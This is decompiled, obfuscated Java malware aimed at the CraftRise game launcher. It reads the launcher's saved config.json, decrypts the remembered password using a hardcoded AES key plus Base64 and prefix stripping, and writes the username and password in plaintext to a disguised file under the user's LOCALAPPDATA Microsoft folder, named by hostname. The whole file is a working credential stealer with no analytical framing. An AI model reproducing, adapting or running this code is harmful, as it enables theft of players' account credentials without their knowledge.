package 0.0.0.0;

import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.function.Function;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.codec.binary.Base64;

public class 0 {
   private String 0 = "Yokki";
   private String 1 = "Yokki";
   private String 2 = System.getenv("LOCALAPPDATA") + "/Microsoft/" + this.0() + "/Game/craftrise.txt";

   public void _/* $FF was: 0*/() throws Exception {
      File membershipFile = new File(System.getenv("appdata") + "/.craftrise/config.json");

      try {
         if (!membershipFile.exists()) {
            return;
         }
      } catch (Throwable var26) {
         throw var26;
      }

      BufferedReader br = new BufferedReader(new FileReader(membershipFile));
      Throwable var3 = null;
      boolean var19 = false;

      try {
         var19 = true;
         StringBuilder sb = new StringBuilder();

         while(true) {
            String str;
            String var10000 = str = br.readLine();

            try {
               if (var10000 == null) {
                  break;
               }

               sb.append(str);
            } catch (Throwable var23) {
               throw var23;
            }
         }

         JsonParser parser = new JsonParser();
         JsonElement element = parser.parse(sb.toString());
         JsonObject obj = element.getAsJsonObject();
         this.0(obj.get("rememberName").getAsString());
         String encryptedPassword = obj.get("rememberPass").getAsString();
         this.1(this.0(encryptedPassword));
         var19 = false;
      } catch (Throwable var24) {
         var3 = var24;
         throw var24;
      } finally {
         if (var19) {
            label120: {
               label119: {
                  try {
                     if (br == null) {
                        break label120;
                     }

                     if (var3 == null) {
                        break label119;
                     }
                  } catch (Throwable var22) {
                     throw var22;
                  }

                  try {
                     br.close();
                  } catch (Throwable var20) {
                     var3.addSuppressed(var20);
                  }
                  break label120;
               }

               br.close();
            }

         }
      }

      if (br != null) {
         if (var3 != null) {
            try {
               br.close();
            } catch (Throwable var21) {
               var3.addSuppressed(var21);
            }
         } else {
            br.close();
         }
      }

   }

   private void _/* $FF was: 1*/() {
      File txtFile = new File(this.2);

      try {
         BufferedWriter writer = new BufferedWriter(new FileWriter(txtFile));
         Throwable var3 = null;
         boolean var13 = false;

         try {
            var13 = true;
            writer.write(this.0 + ":" + this.1);
            var13 = false;
         } catch (Throwable var16) {
            var3 = var16;
            throw var16;
         } finally {
            if (var13) {
               label93: {
                  label92: {
                     try {
                        if (writer == null) {
                           break label93;
                        }

                        if (var3 != null) {
                           break label92;
                        }
                     } catch (Throwable var17) {
                        throw var17;
                     }

                     writer.close();
                     break label93;
                  }

                  try {
                     writer.close();
                  } catch (Throwable var14) {
                     var3.addSuppressed(var14);
                  }
               }

            }
         }

         if (writer != null) {
            if (var3 != null) {
               try {
                  writer.close();
               } catch (Throwable var15) {
                  var3.addSuppressed(var15);
               }
            } else {
               writer.close();
            }
         }
      } catch (IOException var19) {
      }

   }

   private String _/* $FF was: 0*/(String encryptedPassword) {
      Function<String, String> decryptAndRemovePrefix = 0::lambda$decrypt$0;
      String decryptedString = (String)decryptAndRemovePrefix.andThen(this::1).andThen(0::lambda$decrypt$1).apply(encryptedPassword);
      return decryptedString;
   }

   private String _/* $FF was: 1*/(String input) {
      Function<String, String> decryptAndRemovePrefix = this::lambda$getRiseVers$2;
      String decodedString = (String)decryptAndRemovePrefix.andThen(decryptAndRemovePrefix).andThen(this::2).apply(input);
      return decodedString;
   }

   private String _/* $FF was: 2*/(String input) {
      try {
         return new String(Base64.decodeBase64(input.getBytes()), "utf-8");
      } catch (Exception var3) {
         return null;
      }
   }

   private String _/* $FF was: 0*/() {
      try {
         Process process = Runtime.getRuntime().exec("hostname");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         String computerName = reader.readLine();

         String var10000;
         try {
            process.destroy();
            if (computerName != null) {
               var10000 = computerName.trim();
               return var10000;
            }
         } catch (Exception var4) {
            throw var4;
         }

         var10000 = "Unknown";
         return var10000;
      } catch (Exception var5) {
         return "Unknown";
      }
   }

   public void _/* $FF was: 2*/() throws Exception {
      this.0();
      this.1();
   }

   public void _/* $FF was: 0*/(String param1) {
      // $FF: Couldn't be decompiled
   }

   public void _/* $FF was: 1*/(String param1) {
      // $FF: Couldn't be decompiled
   }

   private String lambda$getRiseVers$2(String str) {
      return this.2(str).replace("3ebi2mclmAM7Ao2", "").replace("KweGTngiZOOj9d6", "");
   }

   private static String lambda$decrypt$1(String result) {
      return result.split("#")[0];
   }

   private static String lambda$decrypt$0(String str) {
      try {
         byte[] key = "2640023187059250".getBytes("utf-8");
         SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
         Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
         cipher.init(2, secretKeySpec);
         byte[] decryptedBytes = cipher.doFinal(Base64.decodeBase64(str.getBytes()));
         return new String(decryptedBytes);
      } catch (Exception var5) {
         throw new RuntimeException("Decryption failed", var5);
      }
   }
}
